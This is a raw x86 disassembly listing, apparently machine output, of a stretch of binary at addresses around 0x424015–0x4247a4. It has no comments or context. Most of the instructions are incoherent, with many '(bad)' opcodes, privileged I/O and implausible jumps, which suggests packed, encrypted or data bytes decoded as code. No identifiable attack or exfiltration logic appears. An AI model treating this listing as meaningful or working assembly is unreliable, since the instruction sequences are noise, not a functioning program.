  424015:	mov    DWORD PTR [ebx],eax
  424017:	add    DWORD PTR [ebp+0x47f06e64],ecx
  42401d:	cmp    al,0xc2
  42401f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424020:	pop    edi
  424021:	cmc    
  424022:	pop    ds
  424023:	scas   eax,DWORD PTR es:[edi]
  424024:	iret   
  424025:	add    al,0x2
  424027:	xor    cl,bh
  424029:	adc    bh,ch
  42402b:	mov    eax,ds:0x3e8336b9
  424030:	(bad)  
  424031:	mov    ch,0xbb
  424033:	icebp  
  424034:	and    eax,0x64468c27
  424039:	xchg   edx,eax
  42403a:	jl     0x423ff3
  42403c:	jmp    0x0:0x1e80001
  424043:	lock jle 0x42401d
  424046:	retf   
  424047:	mov    eax,ds:0xb716bb7c
  42404c:	fucompp 
  42404e:	and    al,0x93
  424050:	out    0x1b,al
  424052:	and    BYTE PTR [ebx-0x75a4b7f5],ah
  424058:	pop    esi
  424059:	push   edi
  42405a:	cld    
  42405b:	inc    ebp
  42405c:	or     ebx,DWORD PTR [ecx]
  42405e:	mov    WORD PTR [edx+0x7e],?
  424061:	fld    QWORD PTR [edx-0x29]
  424064:	pushf  
  424065:	inc    esi
  424066:	adc    DWORD PTR [ebx],ecx
  424068:	inc    esi
  424069:	mov    ebx,0x38b7c975
  42406e:	pop    ss
  42406f:	imul   esp,DWORD PTR [eax],0xffffffcf
  424072:	pop    edi
  424073:	cmp    eax,0x72cf82f3
  424078:	ret    
  424079:	adc    bh,BYTE PTR [edx]
  42407b:	xchg   ebx,eax
  42407c:	jge    0x42402e
  42407e:	sbb    DWORD PTR [ecx-0x687a7938],ecx
  424084:	fwait
  424085:	push   esp
  424086:	push   eax
  424087:	cmp    ebp,esi
  424089:	add    DWORD PTR [ebp+ebp*2-0x4d15ceee],ebp
  424090:	sar    BYTE PTR [edx+0x20],0x23
  424094:	popa   
  424095:	dec    esp
  424096:	push   ebp
  424097:	inc    edx
  424098:	fs cdq 
  42409a:	mov    cl,ah
  42409c:	add    al,0xc2
  42409e:	cli    
  42409f:	cmp    eax,0xd36a7f46
  4240a4:	(bad)  
  4240a5:	in     eax,dx
  4240a6:	adc    dh,BYTE PTR [edx]
  4240a8:	mov    ds,eax
  4240aa:	lods   eax,DWORD PTR ds:[esi]
  4240ab:	jno    0x424071
  4240ad:	sub    eax,ebx
  4240af:	pop    ds
  4240b0:	jno    0x4240b5
  4240b2:	xor    bh,BYTE PTR cs:[esi-0x62afc8f]
  4240b9:	push   0x0
  4240bb:	push   cs
  4240bc:	cmp    edx,DWORD PTR [ebx+0x53]
  4240bf:	daa    
  4240c0:	jl     0x424073
  4240c2:	xchg   esi,eax
  4240c3:	mov    dl,BYTE PTR ds:0xe58ec99a
  4240c9:	lods   al,BYTE PTR ds:[esi]
  4240ca:	inc    edi
  4240cb:	stos   DWORD PTR es:[edi],eax
  4240cc:	out    dx,eax
  4240cd:	pushf  
  4240ce:	mov    ebx,0xa0862d9a
  4240d3:	(bad)  
  4240d5:	iret   
  4240d6:	pop    ss
  4240d7:	icebp  
  4240d8:	(bad)  
  4240d9:	mov    ch,0x49
  4240db:	shl    DWORD PTR gs:[edi-0x119433f1],1
  4240e2:	or     ebp,DWORD PTR [edi]
  4240e4:	push   esp
  4240e5:	mov    ah,0x7e
  4240e7:	rol    DWORD PTR [ebp-0x6cf9373b],0xb0
  4240ee:	sbb    al,0xdc
  4240f0:	push   0xffffffc4
  4240f2:	pop    eax
  4240f3:	push   0x6c
  4240f5:	pop    ds
  4240f6:	sub    BYTE PTR [ecx+0x5e1775a7],bl
  4240fc:	sbb    bh,BYTE PTR [esi+eax*4+0x16d8fb7]
  424103:	(bad)  [ecx+0x6e]
  424106:	xchg   ecx,eax
  424107:	add    edi,ebx
  424109:	adc    edi,esp
  42410b:	cmp    eax,0xad85aeb1
  424110:	add    ecx,DWORD PTR [esi-0x18]
  424113:	xor    al,0xf2
  424115:	push   0xffffffbd
  424117:	add    al,0x3c
  424119:	pop    ss
  42411a:	jmp    0x42411e
  42411c:	cmp    DWORD PTR [ecx+eiz*1],edi
  42411f:	fcmovnb st,st(0)
  424121:	inc    esi
  424122:	es pusha 
  424124:	arpl   WORD PTR [ecx],dx
  424126:	and    ax,0x3278
  42412a:	cmp    al,BYTE PTR [edi+0x21]
  42412d:	add    al,0x24
  42412f:	lea    esp,[edx]
  424131:	mov    bl,BYTE PTR [esi+0xd]
  424134:	adc    ecx,esi
  424136:	lods   al,BYTE PTR ds:[esi]
  424137:	clc    
  424138:	sbb    BYTE PTR [ebx],bh
  42413a:	mov    ecx,0xee77a5cd
  42413f:	adc    edx,eax
  424141:	jmp    0x1f6f:0x94778fca
  424148:	push   esp
  424149:	or     cl,ch
  42414b:	mov    cl,0x8a
  42414d:	arpl   WORD PTR [eax+0x27],di
  424150:	imul   esp,DWORD PTR [ecx],0xfffffffd
  424153:	jo     0x4240ea
  424155:	mov    eax,ds:0x85745ac
  42415a:	stos   DWORD PTR es:[edi],eax
  42415b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42415c:	push   0x57
  42415e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42415f:	lds    ebx,FWORD PTR ds:[ebx+esi*2]
  424163:	sub    al,0x4a
  424165:	outs   dx,BYTE PTR gs:[esi]
  424167:	lahf   
  424168:	shl    edi,cl
  42416a:	mov    esi,0x4f02e6ba
  42416f:	daa    
  424170:	aaa    
  424171:	dec    esp
  424172:	xchg   ebx,eax
  424173:	les    esp,FWORD PTR [esi+0x215fe666]
  424179:	mov    dl,0xa2
  42417b:	test   DWORD PTR ds:0xa34fa141,esp
  424181:	adc    DWORD PTR [ebx],edx
  424183:	push   ebx
  424184:	cmp    DWORD PTR [edx+eiz*4+0x40029aec],edx
  42418b:	imul   ecx,DWORD PTR [ebx],0x20
  42418e:	adc    al,0x6
  424190:	test   al,0x57
  424192:	call   0xb7778ec9
  424197:	popf   
  424198:	shrd   DWORD PTR [esi-0x7939b09],esi,cl
  42419f:	(bad)  
  4241a0:	pop    edx
  4241a1:	popf   
  4241a2:	fiadd  WORD PTR [esi+0x34]
  4241a5:	pop    es
  4241a6:	lods   al,BYTE PTR ds:[esi]
  4241a7:	push   ss
  4241a8:	cmp    bh,ah
  4241aa:	lock jge 0x4241bd
  4241ad:	inc    ebp
  4241ae:	out    0x77,al
  4241b0:	loopne 0x424228
  4241b2:	mov    dh,0xea
  4241b4:	dec    esi
  4241b5:	div    DWORD PTR [ecx]
  4241b7:	sub    eax,DWORD PTR [eax]
  4241b9:	pop    ds
  4241ba:	mov    edx,0x39217f98
  4241bf:	pop    ebp
  4241c0:	into   
  4241c1:	inc    ebx
  4241c2:	out    0x69,al
  4241c4:	cs jl  0x424161
  4241c7:	and    al,0xc2
  4241c9:	mov    ebp,0xa6fe4d1a
  4241ce:	sbb    DWORD PTR [esi+0x188851b],esp
  4241d4:	add    dl,dl
  4241d6:	lahf   
  4241d7:	scas   eax,DWORD PTR es:[edi]
  4241d8:	mov    ecx,0xf13eec7c
  4241dd:	mov    ch,0xb9
  4241df:	add    eax,0x78b7dcb1
  4241e4:	cmp    eax,0x73a9040
  4241e9:	push   0x81f11d39
  4241ee:	mov    dl,0xff
  4241f0:	sbb    eax,0x937856a1
  4241f5:	xchg   ebp,eax
  4241f6:	and    BYTE PTR [edx+ecx*4],bl
  4241f9:	mov    ebx,0x3e10b183
  4241fe:	sbb    DWORD PTR [esi+0x6e33c1c2],ebx
  424204:	adc    al,0xd6
  424206:	mov    ch,0xfd
  424208:	mov    BYTE PTR [ecx],0x64
  42420b:	in     eax,dx
  42420c:	xchg   edx,eax
  42420d:	mov    ebp,0xb3e6bfe
  424212:	cmp    esi,DWORD PTR [edx]
  424214:	fdivr  QWORD PTR [edx]
  424216:	addr16 sti 
  424218:	retf   
  424219:	mov    ecx,DWORD PTR [ebp+0x5b]
  42421c:	stos   BYTE PTR es:[edi],al
  42421d:	je     0x424293
  42421f:	xor    eax,0x8cd9e5a0
  424224:	addr16 pop eax
  424226:	push   esp
  424227:	arpl   WORD PTR [ecx],ax
  424229:	cmc    
  42422a:	in     eax,dx
  42422b:	adc    dl,bh
  42422d:	repz or esi,edi
  424230:	das    
  424231:	cli    
  424232:	fist   WORD PTR [ecx]
  424234:	dec    ebx
  424235:	es nop
  424237:	dec    ebp
  424238:	pop    ecx
  424239:	jecxz  0x42428a
  42423b:	lahf   
  42423c:	in     al,dx
  42423d:	add    DWORD PTR [eax],eax
  42423f:	call   0x97424245
  424244:	xchg   BYTE PTR [esi],cl
  424246:	inc    edx
  424247:	cmp    al,bh
  424249:	xor    al,0x6
  42424b:	imul   BYTE PTR [edi]
  42424d:	mov    ch,0x18
  42424f:	(bad)  
  424250:	jge    0x4242ba
  424252:	popf   
  424253:	imul   edx,DWORD PTR [ecx+ebp*1],0x34
  424257:	std    
  424258:	jg     0x4242b8
  42425a:	push   edx
  42425b:	in     eax,dx
  42425c:	inc    esp
  42425d:	push   ds
  42425e:	ins    BYTE PTR es:[edi],dx
  42425f:	mov    ecx,0x4fd245b7
  424264:	mov    eax,ds:0x87f6d216
  424269:	std    
  42426a:	add    al,BYTE PTR [esi]
  42426c:	in     eax,dx
  42426d:	xor    ecx,DWORD PTR [ebp-0x55]
  424270:	sub    edx,eax
  424272:	or     eax,0xcea4cb64
  424277:	out    0x62,eax
  424279:	mov    al,0xda
  42427b:	inc    ecx
  42427c:	add    edi,ebx
  42427e:	jecxz  0x4242c9
  424280:	out    dx,al
  424281:	or     dh,al
  424283:	xor    dl,al
  424285:	aam    0xe6
  424287:	popf   
  424288:	jmp    FWORD PTR [edx+0x3]
  42428b:	iret   
  42428c:	int    0x4e
  42428e:	push   ebp
  42428f:	dec    ebp
  424290:	jp     0x4242d0
  424292:	and    al,0x78
  424294:	jle    0x424236
  424296:	jne    0x42421a
  424298:	adc    eax,0xefed9c4b
  42429d:	ja     0x4242de
  42429f:	jmp    0x20ae8ba2
  4242a4:	fs add eax,0x6078197d
  4242aa:	add    eax,DWORD PTR [edx+0x5beb92ad]
  4242b0:	cmc    
  4242b1:	mov    eax,DWORD PTR [ebx-0x54]
  4242b4:	aas    
  4242b5:	mov    cl,0x3b
  4242b7:	sub    al,BYTE PTR [ebp-0x45]
  4242ba:	cmp    eax,0xf918a651
  4242bf:	push   ss
  4242c0:	or     eax,0xcd001ef9
  4242c5:	adc    DWORD PTR [esp+ebp*8+0x4ed01773],esi
  4242cc:	jmp    0x37bd6609
  4242d1:	pushf  
  4242d2:	(bad)  
  4242d3:	in     al,0x3c
  4242d5:	mov    eax,ds:0xc3701ed1
  4242da:	sbb    BYTE PTR [ecx],ch
  4242dc:	xor    DWORD PTR [eax],edx
  4242de:	or     al,0x5f
  4242e0:	mov    ebx,0x86de6ec
  4242e5:	push   esp
  4242e6:	rcr    BYTE PTR [ebx+0x6be7398f],0x43
  4242ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242ee:	cwde   
  4242ef:	push   esp
  4242f0:	lea    ebp,ds:0xc16990c8
  4242f6:	dec    esi
  4242f7:	adc    edx,ebp
  4242f9:	int3   
  4242fa:	sub    ebp,DWORD PTR [ebp+0x56]
  4242fd:	push   0x68091a90
  424302:	mov    al,BYTE PTR [edi-0x1d]
  424305:	xor    BYTE PTR [ecx+0x263d343],ch
  42430b:	xor    BYTE PTR [eax+0xc],dl
  42430e:	shl    DWORD PTR [ebx-0x47961d9],cl
  424314:	outs   dx,BYTE PTR ds:[esi]
  424315:	mov    eax,ds:0x82324ab7
  42431a:	push   ebx
  42431b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42431c:	popf   
  42431d:	mov    esp,0xb1d5bd4f
  424322:	sar    DWORD PTR [edx-0x39],1
  424325:	fs loopne 0x42439c
  424328:	mov    edi,edi
  42432a:	mov    WORD PTR [ebp+0x28],?
  42432d:	xor    ah,BYTE PTR [esi+0x16]
  424330:	cmp    bl,BYTE PTR [eax+ecx*2+0x5]
  424334:	mov    bl,0xa3
  424336:	and    DWORD PTR [eax+0x1640cc0c],edx
  42433c:	fidiv  WORD PTR fs:[ecx-0x2d320b84]
  424343:	and    al,0x61
  424345:	out    0xcd,eax
  424347:	retf   0xaa35
  42434a:	rol    ecx,1
  42434c:	jne    0x424301
  42434e:	fistp  WORD PTR [edi+0x7df6b4bb]
  424354:	xchg   esp,eax
  424355:	aas    
  424356:	dec    edx
  424357:	pop    ds
  424358:	jl     0x4243b1
  42435a:	imul   DWORD PTR [esi-0x24]
  42435d:	imul   esi,eax,0xffffff8c
  424360:	(bad)  
  424361:	aad    0xb
  424363:	pop    ebx
  424364:	jo     0x424326
  424366:	les    edx,FWORD PTR [esi]
  424368:	inc    eax
  424369:	out    0x14,eax
  42436b:	fs sub eax,eax
  42436e:	mov    edx,0x43b0118b
  424373:	cli    
  424374:	adc    DWORD PTR [ecx],0xc1c22a31
  42437a:	push   0x5a
  42437c:	shl    ecx,0x32
  42437f:	cmp    DWORD PTR [ebx+0x4f],esp
  424382:	ret    
  424383:	fnstsw WORD PTR [ecx+0x5848c883]
  424389:	add    esp,edi
  42438b:	gs jecxz 0x42433a
  42438e:	cmp    al,dh
  424390:	in     al,dx
  424391:	outs   dx,DWORD PTR ds:[esi]
  424392:	test   DWORD PTR es:[esi-0x34af2bf9],ebx
  424399:	int3   
  42439a:	xor    al,BYTE PTR [ecx-0x61]
  42439d:	adc    al,0xa3
  42439f:	imul   ebx,DWORD PTR [edx+0x5ce36869],0xe3c50376
  4243a9:	mov    al,ds:0xe9f2411
  4243ae:	fld    DWORD PTR ds:0xfbdffca1
  4243b4:	mov    bh,0xeb
  4243b6:	cmp    BYTE PTR [ebp-0x6e61df9e],bh
  4243bc:	and    bl,0x2c
  4243bf:	fisub  DWORD PTR [ecx+0x7f]
  4243c2:	xor    DWORD PTR [ecx],esp
  4243c4:	mov    al,ds:0xbc54b739
  4243c9:	lea    ebx,[ebx-0x77b7e5da]
  4243cf:	adc    al,0x30
  4243d1:	int    0x71
  4243d3:	xor    ah,bl
  4243d5:	dec    ebp
  4243d6:	xchg   esi,eax
  4243d7:	xchg   BYTE PTR [edx-0x15d2d849],ah
  4243dd:	xchg   edx,eax
  4243de:	out    0xc4,eax
  4243e0:	inc    esi
  4243e1:	inc    eax
  4243e2:	jae    0x4243d6
  4243e4:	arpl   WORD PTR [eax+0x3e3a1a33],sp
  4243ea:	in     eax,0x65
  4243ec:	(bad)  
  4243ed:	aam    0xea
  4243ef:	or     DWORD PTR [eax-0xe],esi
  4243f2:	mov    ecx,0x8d67f519
  4243f7:	push   ds
  4243f8:	pop    ebp
  4243f9:	aas    
  4243fa:	push   esp
  4243fb:	and    BYTE PTR [eax+0x187ab3ef],ch
  424401:	out    dx,eax
  424402:	rcr    ebx,cl
  424404:	cli    
  424405:	pop    ebx
  424406:	sub    BYTE PTR [edx+0x3e],al
  424409:	dec    ecx
  42440a:	pop    ebp
  42440b:	push   es
  42440c:	xor    eax,DWORD PTR [edx+0x40bd890c]
  424412:	xor    edx,ebp
  424414:	xchg   edi,eax
  424415:	test   BYTE PTR [ebp-0x7c],ah
  424418:	mov    ebp,DWORD PTR [esi]
  42441a:	int3   
  42441b:	jmp    0x4243b0
  42441d:	jne    0x424451
  42441f:	pmullw mm2,QWORD PTR [edx]
  424422:	mov    al,BYTE PTR ds:0x7f9fbb37
  424428:	ins    BYTE PTR es:[edi],dx
  424429:	punpckhdq mm2,QWORD PTR [edx]
  42442c:	mov    edx,0xe6f8c6d8
  424431:	push   ds
  424432:	(bad)  
  424433:	adc    bl,dh
  424435:	cwde   
  424436:	out    dx,al
  424437:	leave  
  424438:	clc    
  424439:	jge    0x42447a
  42443b:	xchg   esi,ebp
  42443d:	add    DWORD PTR [eax],eax
  42443f:	call   0x15424445
  424444:	je     0x424448
  424446:	js     0x424406
  424448:	rcl    DWORD PTR [ecx+0x48e32685],cl
  42444e:	add    eax,0x2d2c87b6
  424453:	xchg   BYTE PTR [edi-0x17263b28],dl
  424459:	and    DWORD PTR [edi+edi*1-0x3c],0x241970ae
  424461:	mov    ds:0x9785e821,eax
  424466:	pop    ds
  424467:	jge    0x42445f
  424469:	inc    esp
  42446a:	out    0xfa,eax
  42446c:	jecxz  0x424425
  42446e:	jo     0x42443e
  424470:	push   esi
  424471:	sub    edx,eax
  424473:	jns    0x424458
  424475:	sub    BYTE PTR [edi-0x38],dl
  424478:	jmp    0x61cd5f23
  42447d:	les    ebp,FWORD PTR [ebx-0x3c8a0025]
  424483:	clc    
  424484:	adc    BYTE PTR [ebp-0x47590d11],bl
  42448a:	sub    BYTE PTR [edi],0xa9
  42448d:	retf   
  42448e:	mov    cl,0xdd
  424490:	ss pusha 
  424492:	dec    edi
  424493:	pop    esi
  424494:	loope  0x4244c2
  424496:	loopne 0x42443a
  424498:	pushf  
  424499:	ins    DWORD PTR es:[edi],dx
  42449a:	vunpckhps ymm4,ymm7,YMMWORD PTR [edx+0x5e8b85a1]
  4244a2:	in     al,dx
  4244a3:	jno    0x4244a6
  4244a5:	mov    bl,ah
  4244a7:	and    al,0x55
  4244a9:	outs   dx,WORD PTR ds:[esi]
  4244ab:	mov    eax,0x7b55eaba
  4244b0:	rol    BYTE PTR [ecx],0xbe
  4244b3:	or     al,0x41
  4244b5:	mov    al,ds:0x9559baef
  4244ba:	ins    BYTE PTR es:[edi],dx
  4244bb:	and    al,0x2c
  4244bd:	test   al,0xda
  4244bf:	xor    al,0x78
  4244c1:	jmp    0x28256f9f
  4244c6:	leave  
  4244c7:	mov    bh,0xed
  4244c9:	and    DWORD PTR [eax],edi
  4244cb:	mov    ebp,0x2371d57c
  4244d0:	outs   dx,BYTE PTR ds:[esi]
  4244d1:	mov    edx,DWORD PTR [ecx+0x60]
  4244d4:	cs inc edi
  4244d6:	cli    
  4244d7:	sar    ebx,cl
  4244d9:	cs daa 
  4244db:	jne    0x4244b6
  4244dd:	adc    ebp,ecx
  4244df:	out    0x82,eax
  4244e1:	lods   al,BYTE PTR ds:[esi]
  4244e2:	xor    al,BYTE PTR [edx]
  4244e4:	mov    eax,ebx
  4244e6:	(bad)  
  4244e7:	pushf  
  4244e8:	push   esi
  4244e9:	add    al,0xe7
  4244eb:	mov    ebx,0xc1804cff
  4244f0:	pushf  
  4244f1:	ret    
  4244f2:	js     0x424551
  4244f4:	ss ret 
  4244f6:	dec    edi
  4244f7:	adc    ebx,DWORD PTR [edi+esi*4+0x33172fad]
  4244fe:	cli    
  4244ff:	(bad)  
  424500:	in     eax,0x1
  424502:	mov    al,ds:0x28428a1
  424507:	inc    edi
  424508:	mov    ah,0x7e
  42450a:	call   0xb4be:0xf465eb2a
  424511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424512:	sub    DWORD PTR [ecx],eax
  424514:	imul   esp
  424516:	sbb    bl,BYTE PTR [ebx-0x5e]
  424519:	out    0x31,eax
  42451b:	push   0x33
  42451d:	std    
  42451e:	out    dx,eax
  42451f:	int    0xfe
  424521:	ds adc eax,0xd5e776b9
  424527:	mov    ah,0x34
  424529:	add    BYTE PTR [edx-0x6a4ad3c9],0x3a
  424530:	adc    dh,BYTE PTR [edi-0x3a899b44]
  424536:	rol    DWORD PTR [ecx+eax*2],1
  424539:	je     0x424522
  42453b:	lahf   
  42453c:	sahf   
  42453d:	repnz popa 
  42453f:	xor    esp,DWORD PTR [edi]
  424541:	and    ah,BYTE PTR ds:0x32558b22
  424547:	clc    
  424548:	mov    ebp,0x3cde9293
  42454d:	fcom   DWORD PTR [ecx-0xe]
  424550:	add    al,0x7e
  424552:	or     eax,0x3b260db
  424557:	push   es
  424558:	data16 loope 0x42455c
  42455b:	imul   edx,DWORD PTR [esi],0x5d9d9a12
  424561:	and    ch,dh
  424563:	sub    bh,al
  424565:	sub    cl,BYTE PTR [esi+0x2e]
  424568:	xchg   ebp,eax
  424569:	jno    0x4245c5
  42456b:	daa    
  42456c:	aas    
  42456d:	mov    WORD PTR ds:0xc826f14e,ds
  424573:	inc    esi
  424574:	sbb    ax,0xb29a
  424578:	jg     0x424574
  42457a:	ror    BYTE PTR [edx-0x7ccf3611],cl
  424580:	scas   eax,DWORD PTR es:[edi]
  424581:	call   0xa0ea020d
  424586:	retf   0x8d5d
  424589:	xchg   esi,eax
  42458a:	test   DWORD PTR [edi-0x147c60bb],ecx
  424590:	push   ebp
  424591:	sub    esp,ebp
  424593:	test   BYTE PTR [edi-0x388ea61b],bh
  424599:	adc    eax,0xd501aa33
  42459e:	mov    eax,ds:0xc4b471a4
  4245a3:	add    BYTE PTR [esi+0x78],dh
  4245a6:	arpl   WORD PTR ds:0x71cb544e,cx
  4245ac:	bound  eax,QWORD PTR [ebx+eiz*1+0x32]
  4245b0:	or     al,0x1
  4245b2:	mov    ebp,edi
  4245b4:	repz adc DWORD PTR [edi+0x1ee2bb06],ebp
  4245bb:	cli    
  4245bc:	push   eax
  4245bd:	jbe    0x424619
  4245bf:	outs   dx,DWORD PTR ds:[esi]
  4245c0:	dec    esp
  4245c1:	(bad)  
  4245c2:	xlat   BYTE PTR ds:[ebx]
  4245c3:	paddusb mm4,QWORD PTR [eax+0x4d]
  4245c7:	retf   
  4245c8:	jg     0x424643
  4245ca:	adc    BYTE PTR [ecx],0x4a
  4245cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ce:	not    bh
  4245d0:	xor    DWORD PTR [edx],eax
  4245d2:	push   eax
  4245d3:	cmc    
  4245d4:	lea    eax,[ecx+0x51b24803]
  4245da:	mov    ebp,0x7f9811ca
  4245df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245e0:	push   0x2f5bab89
  4245e5:	mov    dl,0xc9
  4245e7:	repnz ins BYTE PTR es:[edi],dx
  4245e9:	xor    DWORD PTR [esi],0xffffff90
  4245ec:	fidiv  DWORD PTR [esi+0x657eb72]
  4245f2:	xchg   edi,eax
  4245f3:	sub    ecx,DWORD PTR [esi]
  4245f5:	xor    BYTE PTR [ebp+ecx*4-0x4d],ah
  4245f9:	loope  0x424674
  4245fb:	mov    ebx,DWORD PTR [edx-0x143fb898]
  424601:	div    BYTE PTR es:[esi-0x23005261]
  424608:	push   ecx
  424609:	sti    
  42460a:	and    dl,BYTE PTR [edx+0x408e04a2]
  424610:	aaa    
  424611:	push   eax
  424612:	pop    ecx
  424613:	mov    cl,BYTE PTR [edi+ebx*1+0x22aa9a51]
  42461a:	cmc    
  42461b:	icebp  
  42461c:	or     BYTE PTR [ecx],al
  42461e:	inc    ecx
  42461f:	loope  0x4245ca
  424621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424622:	fnstenv [ebp-0x2c]
  424625:	and    DWORD PTR [ecx],0xffffffec
  424628:	popf   
  424629:	jecxz  0x424651
  42462b:	add    BYTE PTR [eax],dh
  42462d:	inc    ebx
  42462e:	add    BYTE PTR [eax+esi*1],al
  424631:	inc    ebx
  424632:	add    BYTE PTR [eax],cl
  424634:	xor    BYTE PTR [ebx+0x0],al
  424637:	or     al,0x30
  424639:	inc    ebx
  42463a:	add    BYTE PTR [eax],dl
  42463c:	xor    BYTE PTR [ebx+0x0],al
  42463f:	adc    al,0x30
  424641:	inc    ebx
  424642:	add    BYTE PTR [eax],bl
  424644:	xor    BYTE PTR [ebx+0x0],al
  424647:	sbb    al,0x30
  424649:	inc    ebx
  42464a:	add    BYTE PTR [esi+0x49],cl
  42464d:	dec    esi
  42464e:	pop    edi
  42464f:	pop    edx
  424650:	dec    edx
  424651:	inc    ecx
  424652:	xor    eax,DWORD PTR [eax]
  424654:	push   ebx
  424655:	push   edi
  424656:	inc    edi
  424657:	cmp    DWORD PTR [edi+0x41],ebx
  42465a:	pop    eax
  42465b:	ss push esi
  42465d:	pop    ecx
  42465e:	add    BYTE PTR [ebx+0x43],dl
  424661:	inc    ebp
  424662:	pop    edi
  424663:	inc    ecx
  424664:	pop    eax
  424665:	push   edi
  424666:	dec    eax
  424667:	inc    edx
  424668:	pop    edi
  424669:	cmp    DWORD PTR [ecx+0x4d],ecx
  42466c:	dec    ecx
  42466d:	add    BYTE PTR [ecx+0x46],al
  424670:	cmp    DWORD PTR [edx],esi
  424672:	xor    ebx,DWORD PTR [edi+0x32]
  424675:	aaa    
  424676:	inc    esp
  424677:	inc    esp
  424678:	pop    edi
  424679:	xor    eax,0x41545800
  42467e:	pop    edi
  42467f:	push   ecx
  424680:	push   esp
  424681:	inc    esi
  424682:	push   ebp
  424683:	cmp    DWORD PTR [eax],eax
  424685:	push   edi
  424686:	push   ebp
  424687:	inc    ecx
  424688:	xor    dh,BYTE PTR [ebx]
  42468a:	xor    ebx,DWORD PTR [edi+0x4e]
  42468d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  424691:	cmp    DWORD PTR [edi+0x38],ebx
  424694:	dec    ecx
  424695:	cmp    DWORD PTR [edx+0x36],ebx
  424698:	pop    edi
  424699:	dec    edx
  42469a:	xor    BYTE PTR [edx+0x34],cl
  42469d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  4246a1:	xor    esi,DWORD PTR [eax]
  4246a3:	pop    edi
  4246a4:	inc    edx
  4246a5:	dec    ebx
  4246a6:	pop    eax
  4246a7:	pop    eax
  4246a8:	xor    eax,0x51414d00
  4246ad:	pop    edi
  4246ae:	inc    ecx
  4246af:	xor    al,BYTE PTR [ebp+0x5f]
  4246b2:	inc    ecx
  4246b3:	dec    ebx
  4246b4:	cmp    DWORD PTR ds:0x5a003939,esi
  4246ba:	inc    ebp
  4246bb:	cmp    BYTE PTR [edi+0x4d],bl
  4246be:	ss dec eax
  4246c0:	dec    ebx
  4246c1:	add    BYTE PTR [ebp+0x57],al
  4246c4:	xor    DWORD PTR [edi+0x31],ebx
  4246c7:	dec    ebx
  4246c8:	xor    eax,DWORD PTR [ecx+0x30]
  4246cb:	push   ebx
  4246cc:	add    BYTE PTR [edx+esi*1+0x36],al
  4246d0:	aaa    
  4246d1:	pop    edi
  4246d2:	push   edx
  4246d3:	dec    eax
  4246d4:	dec    ebp
  4246d5:	cmp    BYTE PTR [edi+0x37],bl
  4246d8:	inc    esi
  4246d9:	xor    eax,0x35005500
  4246de:	add    BYTE PTR [ebx+0x0],al
  4246e1:	pop    edi
  4246e2:	add    BYTE PTR [ecx+0x0],bl
  4246e5:	dec    ecx
  4246e6:	add    BYTE PTR [ebx+0x0],dl
  4246e9:	xor    al,BYTE PTR [eax]
  4246eb:	pop    edi
  4246ec:	add    BYTE PTR [edx+0x0],dl
  4246ef:	add    BYTE PTR [eax],al
  4246f1:	push   eax
  4246f2:	add    BYTE PTR [ebp+0x0],dl
  4246f5:	dec    ecx
  4246f6:	add    BYTE PTR [eax],dh
  4246f8:	add    BYTE PTR [edi+0x0],bl
  4246fb:	inc    ebx
  4246fc:	add    BYTE PTR [esi],dh
  4246fe:	add    BYTE PTR [ebp+0x0],al
  424701:	xor    al,BYTE PTR [eax]
  424703:	pop    edi
  424704:	add    BYTE PTR [ebp+0x0],cl
  424707:	xor    al,0x0
  424709:	dec    edx
  42470a:	add    BYTE PTR [edx+0x0],dl
  42470d:	push   ebp
  42470e:	add    BYTE PTR [eax],al
  424710:	add    BYTE PTR [esi+0x0],cl
  424713:	cmp    DWORD PTR [eax],eax
  424715:	push   eax
  424716:	add    BYTE PTR [edi+0x0],bl
  424719:	push   ebp
  42471a:	add    BYTE PTR [ecx],bh
  42471c:	add    BYTE PTR [esi],dh
  42471e:	add    BYTE PTR [eax],dh
  424720:	add    BYTE PTR [ecx],dh
  424722:	add    BYTE PTR [edi+0x0],bl
  424725:	dec    edi
  424726:	add    BYTE PTR [esi+0x0],cl
  424729:	push   esp
  42472a:	add    BYTE PTR [eax],bh
  42472c:	add    BYTE PTR [eax],al
  42472e:	add    BYTE PTR [eax+eax*1+0x34],cl
  424732:	add    BYTE PTR [eax+eax*1+0x31],al
  424736:	add    BYTE PTR [edi+0x0],bl
  424739:	dec    ebx
  42473a:	add    BYTE PTR [ecx],dh
  42473c:	add    BYTE PTR [ebp+0x0],al
  42473f:	pop    edi
  424740:	add    BYTE PTR [edx+0x0],bl
  424743:	add    BYTE PTR [eax],al
  424745:	push   esp
  424746:	add    BYTE PTR [edi],dh
  424748:	add    BYTE PTR [ebx+0x0],al
  42474b:	pop    edi
  42474c:	add    BYTE PTR [edx+0x0],al
  42474f:	xor    al,BYTE PTR [eax]
  424751:	xor    DWORD PTR [eax],eax
  424753:	push   ebx
  424754:	add    BYTE PTR [ecx],dh
  424756:	add    BYTE PTR [ecx],bh
  424758:	add    BYTE PTR [edx+0x0],al
  42475b:	add    BYTE PTR [eax],al
  42475d:	inc    edi
  42475e:	add    BYTE PTR [ebp+0x0],al
  424761:	xor    al,0x0
  424763:	cmp    BYTE PTR [eax],al
  424765:	add    BYTE PTR [eax],al
  424767:	add    al,dh
  424769:	inc    edx
  42476a:	add    BYTE PTR [eax+esi*8],al
  42476d:	inc    edx
  42476e:	add    BYTE PTR [eax],cl
  424770:	lock inc edx
  424772:	add    BYTE PTR [eax+esi*8],cl
  424775:	inc    edx
  424776:	add    BYTE PTR [eax],dl
  424778:	lock inc edx
  42477a:	add    BYTE PTR [eax+esi*8],dl
  42477d:	inc    edx
  42477e:	add    BYTE PTR [eax],bl
  424780:	lock inc edx
  424782:	add    BYTE PTR [eax+esi*8],bl
  424785:	inc    edx
  424786:	add    BYTE PTR [eax],ah
  424788:	lock inc edx
  42478a:	add    BYTE PTR [eax+esi*8],ah
  42478d:	inc    edx
  42478e:	add    BYTE PTR [eax],ch
  424790:	lock inc edx
	...
  4247a2:	add    BYTE PTR [eax],al
  4247a4:	call   0x0:0x4d3ef2
